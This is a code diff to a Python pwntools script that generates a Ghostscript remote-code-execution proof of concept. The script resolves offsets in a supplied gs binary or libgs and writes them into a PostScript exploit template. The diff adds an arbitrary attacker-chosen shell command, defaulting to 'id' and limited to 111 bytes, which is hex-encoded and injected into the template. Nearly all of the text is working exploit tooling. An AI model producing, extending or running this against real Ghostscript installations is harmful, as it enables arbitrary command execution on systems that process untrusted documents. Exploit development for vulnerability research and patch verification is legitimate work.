@@ -8,12 +8,22 @@
 from pwn import *
 from sys import argv
 
-if len(argv) != 2:
-    print("Usage: python {argv[0]} /path/to/gs_bin or libgs")
+if len(argv) < 2:
+    print("Usage: python {argv[0]} </path/to/gs_bin or libgs> [rce command(<=111Byte) default:id]")
     exit(1)
 
 
 elf_path = argv[1]
+
+if len(argv) > 2:
+    rce_cmd = argv[2]
+    rce = rce_cmd.encode()
+    if len(rce) > 111 or len(rce) == 0:
+        print("Invalid rce command: improper length; 0 < len(rce.encode()) < 112")
+        exit(2)
+else:
+    rce_cmd = 'id'
+rce = rce_cmd.encode().ljust(112, b'\0').hex()
 
 # Load the ELF file
 elf = ELF(elf_path)
@@ -33,11 +43,14 @@ print("f_addr_s_std_noseek address: 0x{:x}".format(f_addr_s_std_noseek.address))
 f_addr_s_std_noseek_offset = f_addr_s_std_noseek.address - init_addr
 print("Offset from .init start addr to f_addr_s_std_noseek: 0x{:x} == {:d}".format(f_addr_s_std_noseek_offset, f_addr_s_std_noseek_offset))
 
+print("The command to execute is: {}".format(rce_cmd))
+
 with open("final-poc.ps.template", "r") as f:
     final_file = f.read().strip()
 
 final_file = final_file.replace("F_ADDR_S_STD_NOSEEK_OFFSET", str(f_addr_s_std_noseek_offset))
 final_file = final_file.replace("LIBC_PLT_OFFSET", str(libc_plt_offset))
+final_file = final_file.replace("CMD_INJECT", rce)
 
 with open("final-poc.ps", "w") as f:
     f.write(final_file)
